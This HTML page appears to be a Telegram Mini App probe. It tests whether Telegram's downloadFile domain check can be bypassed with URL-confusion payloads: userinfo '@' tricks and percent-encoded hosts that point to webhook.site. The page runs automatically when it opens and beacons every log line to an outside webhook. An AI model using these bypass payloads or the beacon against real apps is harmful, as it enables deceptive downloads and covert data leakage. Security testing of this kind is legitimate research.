<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>web-app-ext matrix v4</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
body { font-family: monospace; background: #fff; color: #111; padding: 6px; font-size: 11px; margin: 0; }
#out { max-height: 100vh; overflow-y: auto; }
.log { border-bottom: 1px solid #eee; padding: 2px 0; word-break: break-all; }
.ok { color: green; } .bad { color: #b00; } .dim { color: #888; }
</style>
</head>
<body>
<div id="out"></div>
<script>
const WH = 'https://webhook.site/74aa897d-5aac-4477-890c-179212c5e77b';
const DOM = 'matthewadem.github.io';
const tg = window.Telegram.WebApp;
const out = document.getElementById('out');
let seq = 0;
function log(msg, cls) {
  const d = document.createElement('div');
  d.className = 'log ' + (cls || '');
  d.textContent = (++seq) + '| ' + msg;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
  try { navigator.sendBeacon(WH + '/log', String(seq) + ' ' + msg); } catch(e) {}
}
const hasData = !!tg.initData;
log('probe4 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (hasData ? 'yes' : 'NO'));
tg.ready();

const CASES = [
  { id: 'plain-foreign',  url: WH + '/m1-plain-foreign.png' },
  { id: 'userinfo',       url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m2-userinfo.png' },
  { id: 'encoded-at',     url: 'https://' + DOM + '%40webhook.site/m4.png' },
  { id: 'at-enc-user',    url: 'https://' + DOM + '@%77ebhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m5.png' },
  { id: 'own-domain',     url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
  { id: 'tg-origin',      url: 'https://web.telegram.org/k/m7-tgorigin.png' }
];

let idx = 0;
function next() {
  if (idx >= CASES.length) { log('MATRIX DONE', 'ok'); return; }
  const c = CASES[idx++];
  log('[' + c.id + '] calling…', 'dim');
  try {
    const p = tg.downloadFile(c.url, 'probe_' + c.id + '.png');
    log('[' + c.id + '] returned ' + (p && typeof p.then === 'function' ? 'Promise' : String(p)));
    if (p && typeof p.then === 'function') {
      p.then(v => log('[' + c.id + '] resolved: ' + JSON.stringify(v), 'ok'),
              e => log('[' + c.id + '] rejected: ' + (e && e.message || e), 'bad'));
    }
  } catch (e) {
    log('[' + c.id + '] threw: ' + (e && e.message || e), 'bad');
  }
  setTimeout(next, 3500);
}
tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));
if (hasData) {
  log('autorun in 2s');
  setTimeout(next, 2000);
} else {
  log('no initData - not autorunning');
}
</script>
</body>
</html>
